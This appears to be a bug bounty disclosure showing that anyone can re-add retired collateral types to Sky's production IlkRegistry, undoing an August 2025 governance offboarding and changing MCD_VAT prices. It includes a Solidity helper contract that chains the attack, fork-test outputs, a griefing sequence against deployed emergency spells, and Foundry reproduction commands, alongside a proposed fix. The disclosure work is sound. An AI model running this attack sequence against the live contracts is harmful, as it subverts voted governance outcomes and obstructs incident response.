# Permissionless IlkRegistry add atomically defeats coordinated governance oracle retirement and reactivates retired paths in MCD_VAT

## Severity

**Submitted severity:** Critical

**Selected in-scope impact:**

> Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Affected production components

Primary root cause:

- `IlkRegistry`
- Production address: `0x5a464C28D19848f44199D003BeF5ecc87d090F87`
- Source: `sky-ecosystem/ilk-registry/src/IlkRegistry.sol`

Confirmed downstream components:

- `MCD_SPOT`: `0x65C79fcB50Ca1594B025960e539eD7A9a6D434A3`
- `MCD_VAT`: `0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B`
- OmegaPoker: `0xDd538C362dF996727054AC8Fb67ef5394eC9b8b9`
- MultiOsmStopSpell: `0x3021dEdB0bC677F43A23Fcd1dE91A07e5195BaE8`
- MultiClipBreakerSpell: `0x828824dBC62Fba126C76E0Abe79AE28E5393C2cb`

Network: Ethereum mainnet.

All state-changing validation was performed only on local mainnet forks. No public-network transactions were sent.

## Summary

The August 7, 2025 executive proposal enacted a coordinated retirement of legacy collateral/oracle paths:

1. legacy oracle keys were removed from Chainlog; and
2. the corresponding offboarded ilks were removed from IlkRegistry to finalize their offboarding.

The production IlkRegistry cannot preserve that terminal lifecycle state. `removeAuth(ilk)` deletes the record, but no governance-controlled tombstone is stored. Any account can later call permissionless `add(address)` with the old Join adapter while the adapter remains authorized in Vat and residual Spotter/Dog configuration remains present.

The important cross-control failure is that `add()` reconstructs the record's `pip` from residual `MCD_SPOT` state, not from Chainlog. Therefore removing a legacy oracle from Chainlog does not prevent that retired oracle path from being reintroduced through IlkRegistry.

A single unprivileged helper call can perform the full end-to-end sequence:

```text
cast the real approved spell
-> re-add 31 retired ilks
-> OmegaPoker.refresh()
-> OmegaPoker.poke()
```

Before that one external call returns:

```text
approved spell.done()                         true
selected oracle keys still absent in Chainlog 8
Registry ilks restored                         31
retired paths recached by OmegaPoker            7
retired MCD_VAT.spot values changed              2
final Registry count                            61
call gas used                            13,401,327
block gas limit                          44,868,168
```

The clean governance result is `72 -> 30`. The attacker-controlled result is `72 -> 30 -> 61`, while the spell reports `done == true` and the coordinated Chainlog retirement remains in place.

The same primitive remains currently executable without any historical spell. At pinned block `25,694,337`, one public helper call performs:

```text
31 permissionless add() calls
-> OmegaPoker.refresh()
-> OmegaPoker.poke()
```

and produces:

```text
Registry count                         35 -> 66
retired ilks restored                       31
retired ilks recached by OmegaPoker         26
retired MCD_VAT.spot values changed         15
one-call gas used                    11,175,460
block gas limit                      60,000,000
```

## Root cause

IlkRegistry intentionally supports public technical reconstruction of a missing standard collateral record. Its checks establish that an adapter still points to the production Vat and that residual oracle/liquidation configuration exists:

```solidity
function add(address adapter) external {
    JoinLike join = JoinLike(adapter);

    require(join.vat() == address(vat), "IlkRegistry/invalid-join-adapter-vat");
    require(vat.wards(address(join)) == 1, "IlkRegistry/adapter-not-authorized");

    bytes32 ilk = join.ilk();
    require(ilkData[ilk].join == address(0), "IlkRegistry/ilk-already-exists");

    (address pip,) = spot.ilks(ilk);
    require(pip != address(0), "IlkRegistry/pip-invalid");

    // Dog/Cat liquidation pointer validation follows.
    // No governance lifecycle or terminal-offboarding check exists.
}
```

The official tests demonstrate an intended temporary `removeAuth -> add` refresh workflow. That use case is not itself the vulnerability.

The vulnerability is that the same missing-record state is also used for a semantically different operation: governance-authorized terminal offboarding. Once `removeAuth()` returns, the contract stores no information that the removal was final. Permissionless code therefore treats terminal offboarding exactly like temporary refresh.

This creates two conflicting state machines:

```text
Intended temporary refresh:
registered -> removeAuth -> absent temporarily -> add -> registered

Intended terminal offboarding:
registered -> removeAuth -> absent permanently

Actual terminal path:
registered -> removeAuth -> indistinguishable absence -> any user add -> registered
```

## Governance baseline

Official proposal:

```text
Executive Vote - August 7, 2025
```

The proposal separately stated that:

- legacy oracle contracts would be removed from Chainlog; and
- listed offboarded vault types would be removed from IlkRegistry to finalize their offboarding.

Real deployed spell:

```text
0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5
```

Fork block:

```text
23,118,263
```

This is one block before the real cast transaction.

Clean execution:

```text
pre-cast Registry count  72
post-cast Registry count 30
removed Registry records 42
spell.done()              true
```

## Primary PoC: one unprivileged call defeats both retirement controls and reaches MCD_VAT

Test:

```text
src/IlkRegistryAtomicOracleRetirementProof.t.sol
```

The helper contract has no ward, Pause Proxy, Chief, governance, or oracle privilege. Its public method only invokes public protocol entry points:

```solidity
function execute(
    address spell,
    address registry,
    address[] calldata adapters,
    address omega
) external returns (uint256 restored) {
    DssSpellLike(spell).cast();

    for (uint256 i = 0; i < adapters.length; i++) {
        (bool ok,) = registry.call(
            abi.encodeWithSignature("add(address)", adapters[i])
        );
        if (ok) restored++;
    }

    OmegaPokerLike(omega).refresh();
    OmegaPokerLike(omega).poke();
}
```

Machine result:

```text
[PASS] testOneExternalCallReactivatesRetiredOraclePathIntoVat()
approved spell done true
Chainlog keys still retired 8
Registry ilks restored in same call 31
retired ilks recached in same call 7
retired Vat.spot values changed in same call 2
final Registry count 61
end-to-end call gas used 13,401,327
block gas limit 44,868,168
```

The selected Chainlog keys remain absent. The attacker does not restore or modify Chainlog. Instead, IlkRegistry recreates the oracle pointers from residual Spotter configuration, and OmegaPoker treats the reconstructed Registry as canonical.

The seven selected retired paths recached by OmegaPoker are:

```text
AAVE-A
BAL-A
COMP-A
LINK-A
RENBTC-A
UNI-A
ZRX-A
```

The two selected `MCD_VAT.spot` changes observed in the same transaction are:

```text
LINK-A
72,000,000,000,000,000,000,000,000
->
145,650,900,000,000,000,000,000,000

RENBTC-A
860,343,300,000,000,000,000,000,000,000
->
2,397,198,400,000,000,000,000,000,000,000
```

`Spotter.poke` is public, so this report does not claim that the call itself is an access-control bypass. The demonstrated security failure is that governance removed the paths from both discovery/control surfaces, yet permissionless Registry reconstruction makes deployed list consumers treat them as active protocol configuration again.

## Independent current-state PoC

Test:

```text
src/IlkRegistryCurrentAtomicVatPropagation.t.sol
```

Pinned block:

```text
25,694,337
```

This test does not invoke a historical spell and does not impersonate governance. A single unprivileged helper call performs all additions and downstream calls before returning.

Machine result:

```text
[PASS] testCurrentOneExternalCallRestoresLegacyPathsAndChangesVat()
current Registry baseline 35
current one-call restored ilks 31
current final Registry count 66
current retired ilks recached 26
current retired Vat.spot values changed 15
current one-call gas used 11,175,460
block gas limit 60,000,000
```

The 15 current `MCD_VAT.spot` changes are:

```text
CRVV1ETHSTETH-A
GNO-A
KNC-A
LINK-A
RENBTC-A
UNIV2AAVEETH-A
UNIV2DAIETH-A
UNIV2DAIUSDT-A
UNIV2ETHUSDT-A
UNIV2LINKETH-A
UNIV2UNIETH-A
UNIV2USDCETH-A
UNIV2WBTCDAI-A
UNIV2WBTCETH-A
USDT-A
```

All positively restored ilks have `Art == 0` and `line == 0`. The report does not claim that these spot changes reopen borrowing or trigger liquidations.

## Current addability is proved per adapter

Test:

```text
src/IlkRegistryCurrentMassReAdd.t.sol
```

At the pinned current block, every one of the 31 adapters is asserted individually to:

- map to the production Vat;
- report the expected ilk;
- have `live == 1`;
- remain a Vat ward;
- be absent from Registry before the call;
- be accepted by the actual production `add()` implementation;
- appear in `list()` afterward; and
- produce non-zero Registry oracle and liquidation pointers.

Result:

```text
initial Registry count 35
successful additions    31 / 31
final Registry count    66
```

### Residual-debt negative control

`RWA012-A` and `RWA013-A` each have residual `Art == 1`, but both additions revert with:

```text
IlkRegistry/invalid-auction-contract
```

They are not included in the impact claim.

## Deployed emergency-response consequences

IlkRegistry is also a live input to deployed emergency spells.

### MultiOsmStopSpell

Production address:

```text
0x3021dEdB0bC677F43A23Fcd1dE91A07e5195BaE8
```

### MultiClipBreakerSpell

Production address:

```text
0x828824dBC62Fba126C76E0Abe79AE28E5393C2cb
```

Both contracts dynamically enumerate `IlkRegistry.list()`, and their `done()` result depends on all entries in that mutable list.

The fork test first models the legitimate governance precondition that the deployed emergency spell is selected as Chief hat, executes it to a clean completed state, and only then performs the attacker-controlled permissionless Registry additions.

Test:

```text
src/IlkRegistryEmergencySpellImpact.t.sol
```

Results:

```text
MultiOsmStopSpell:
new pending obligations after restoration 25
completed done() after restoration         false
clean execution gas                        565,414
re-execution gas                         1,100,041

MultiClipBreakerSpell:
new pending obligations after restoration 30
completed done() after restoration         false
clean execution gas                        932,887
re-execution gas                         2,637,142
```

The attacker does not control Chief or select the emergency spell. The privileged setup represents a legitimate defender action. The attacker-controlled step is only `IlkRegistry.add()` after the clean emergency execution.

### Staged re-execution grief

An attacker can add the legacy adapters one at a time after each defender response. Each qualifying addition makes the deployed emergency spell incomplete again.

Test:

```text
src/IlkRegistryEmergencyReexecutionGrief.t.sol
```

Results:

```text
MultiOsmStopSpell:
staged additions                    31
forced emergency re-executions      25
total repeated response gas 12,279,717
maximum single response gas    695,440

MultiClipBreakerSpell:
staged additions                    31
forced emergency re-executions      30
total repeated response gas 26,663,517
maximum single response gas  1,364,039
```

This is presented as confirmed incident-response grief and mutable-completion behavior, not as a block-gas denial of service or fund loss.

## Persistence

After restoration, an unprivileged caller cannot simply remove the entries again. Public `remove()` requires the Join to be caged, while all 31 positively restored Join adapters remain `live == 1`.

Fork result:

```text
restored entries                        31
public removals blocked by live Joins   31
Registry count after removal attempts   66
```

The attacker-created state persists until another privileged governance action.

## Why obvious companion actions are insufficient

### Caging the Join

Caging alone is not a terminal block because `add()` does not check `Join.live()`.

The following cycle succeeds on a fork:

```text
cage -> add -> remove -> add
```

### Denying the Join in Vat

`Vat.deny(join)` blocks Registry addition, but `GemJoin.exit()` uses the same Vat authorization through `Vat.slip` and reverts with `Vat/not-authorized` after denial.

At the pinned current block, the AAVE Join held approximately:

```text
77.033778046632910564 AAVE
```

Therefore denying every legacy Join is not a universal zero-balance cleanup action that safely preserves collateral exit.

Governance can still repair the system through a new collateral-specific spell or a Registry upgrade. The finding is that the original authorized terminal action did not create a terminal state and remains permissionlessly reversible.

## Counterevidence and bounded claims

The following were explicitly tested and are **not** claimed:

1. **Debt reopening.** All 31 positively restored ilks have `line == 0`; residual AutoLine configuration is zero and none is enabled in LineMom.
2. **Residual-debt RWA restoration.** The tested RWA adapters with `Art == 1` revert in production `add()`.
3. **Active legacy auctions or auction funds.** The 31 restored Clipper entries have zero active auctions and zero Clipper `Vat.gem` balance at the pinned block.
4. **Current swap-and-pop batch skipping.** The current 35-entry Registry has zero publicly removable class-1/class-2 entries.
5. **Historical `remove -> removeAuth` race against the 2025 spell.** None of that spell's targets was publicly removable before cast.
6. **Paid keeper work or block-gas DoS.** Keeper outcomes did not become executable, and all measured transactions fit within the block gas limit.
7. **Theft, insolvency, liquidation, or borrowing.** None is demonstrated.
8. **Malicious Join substitution.** No second historical Join address for the same tested symbolic ilk was established.

## Impact

The narrow demonstrated governance deviation is objective:

```text
approved clean result:
- selected legacy oracle keys absent from Chainlog
- selected offboarded ilks absent from Registry
- Registry count 30
- retired selected paths absent from OmegaPoker cache

attacker-controlled result before the same external call returns:
- selected legacy oracle keys still absent from Chainlog
- 31 removed ilks restored through residual Spotter configuration
- Registry count 61
- 7 selected retired paths recached by OmegaPoker
- 2 selected retired MCD_VAT.spot values changed
- approved spell.done() true
```

This does not rely on governance approving malicious code. It executes the real approved spell unchanged and uses only public functions after the governance delay.

The current deployment independently retains the same primitive: one permissionless call restores 31 retired records, recaches 26 retired paths, and changes 15 `MCD_VAT.spot` values.

The emergency-spell tests additionally prove that the reconstructed records are treated as live security obligations by deployed Sky incident-response contracts and can force repeated emergency completion cycles.

## Reproduction

Prerequisites:

- Foundry;
- an archive-capable Ethereum RPC;
- repository branch `audit/ilk-registry-readd-proof`.

```bash
export ETH_RPC_URL='<ARCHIVE_RPC>'

forge build

# Strongest historical one-call proof
forge test \
  --match-path src/IlkRegistryAtomicOracleRetirementProof.t.sol \
  --match-test testOneExternalCallReactivatesRetiredOraclePathIntoVat \
  -vvvv

# Current one-call proof, no historical spell
forge test \
  --match-path src/IlkRegistryCurrentAtomicVatPropagation.t.sol \
  --match-test testCurrentOneExternalCallRestoresLegacyPathsAndChangesVat \
  -vvvv

# Differential coordinated-retirement proof
forge test \
  --match-path src/IlkRegistryChainlogRetirementBypass.t.sol \
  --match-test testAtomicReAddBypassesCoordinatedChainlogOracleRetirement \
  -vvvv

# Deployed emergency completion proof
forge test \
  --match-path src/IlkRegistryEmergencySpellImpact.t.sol \
  -vvvv

# Staged repeated emergency response proof
forge test \
  --match-path src/IlkRegistryEmergencyReexecutionGrief.t.sol \
  -vvvv
```

## Recommended remediation

A `Join.live()` check alone is insufficient because the currently affected 31 adapters are live to preserve exits.

The Registry needs a governance-controlled terminal lifecycle state, for example:

```solidity
mapping(bytes32 => bool) public blocked;

function blockIlk(bytes32 ilk) external auth {
    blocked[ilk] = true;
    if (ilkData[ilk].class != 0) _remove(ilk);
}

function unblockIlk(bytes32 ilk) external auth {
    blocked[ilk] = false;
}

function add(address adapter) external {
    bytes32 ilk = JoinLike(adapter).ilk();
    require(!blocked[ilk], "IlkRegistry/ilk-blocked");
    // Existing technical validation follows.
}
```

Terminal offboarding spells should set the terminal block as part of the same governance action that removes the record and retires its Chainlog oracle keys. Temporary technical refreshes can continue using `removeAuth -> add` when governance deliberately leaves the tombstone unset.

Separately:

- harden `_remove` with existence and array/mapping consistency checks;
- decide explicitly whether caged adapters may be added; and
- ensure list-consuming emergency contracts use a governance-stable target set or lifecycle-aware Registry view.

## Evidence index

Primary proofs:

- Atomic governance cleanup reversal: workflow run `31082020451`
- Atomic coordinated oracle-retirement bypass into Vat: workflow run `31087775218`
- Current one-call Vat propagation: workflow run `31088226922`, successful final attempt
- Differential Chainlog/Registry retirement bypass: workflow run `31086708376`
- Current exact 31-adapter restoration: canonical/current validation workflows
- OmegaPoker exact current deltas: workflow run `31084770021`

Emergency consequences:

- Deployed emergency completion reopening: workflow run `31086518004`
- Staged emergency re-execution grief: workflow run `31088034426`

Counterevidence:

- Current public-removal scan: workflow run `31087074419`
- Residual debt-automation scan: workflow run `31087315028`
- Legacy auction-state scan: workflow run `31087623400`
- Persistence and mitigation tests: workflow run `31081065745`
- Keeper bounded-impact test: workflow run `31080500141`
